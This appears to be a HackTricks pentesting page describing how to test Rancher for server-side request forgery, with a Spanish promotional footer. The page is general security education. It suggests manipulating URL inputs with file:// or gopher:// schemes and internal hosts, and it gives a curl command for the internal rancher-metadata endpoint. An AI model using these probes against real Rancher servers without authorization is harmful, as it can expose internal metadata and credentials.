Rancher is a popular open-source container management platform that allows users to easily deploy and manage containers in a Kubernetes cluster. It provides a user-friendly interface and a wide range of features for managing containerized applications.

Rancher supports various cloud providers, including AWS, GCP, and Azure, allowing users to deploy their containers on different cloud platforms. It also provides integration with other tools and services, such as monitoring and logging solutions, to enhance the management and monitoring capabilities of containerized applications.

As a pentester, it is important to understand the security implications of using Rancher and how to test for vulnerabilities. One common vulnerability that can be exploited in Rancher is Server-Side Request Forgery (SSRF).

SSRF occurs when an attacker is able to make requests from the server to other internal or external resources. This can be used to bypass security controls and access sensitive information or perform actions on behalf of the server.

In the context of Rancher, an SSRF vulnerability can allow an attacker to make requests to internal services or cloud APIs that are accessible from the Rancher server. This can potentially lead to unauthorized access to sensitive data or even compromise the entire infrastructure.

To test for SSRF vulnerabilities in Rancher, you can start by identifying any user input that is used to construct URLs or make requests. This can include parameters in API calls, URLs in configuration files, or user-controlled input in the Rancher interface.

Once you have identified the user input, you can try to manipulate it to make requests to internal or external resources. This can involve using different protocols (such as file:// or gopher://) or specifying IP addresses or hostnames that resolve to internal resources.

It is also important to check for any SSRF protection mechanisms that may be in place, such as whitelisting or blacklisting of certain URLs or IP addresses. These can help mitigate the risk of SSRF vulnerabilities.

Overall, understanding and testing for SSRF vulnerabilities in Rancher is crucial for ensuring the security of containerized applications deployed using this platform. By identifying and addressing these vulnerabilities, you can help protect against potential attacks and data leaks.
```
curl http://rancher-metadata/<version>/<path>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
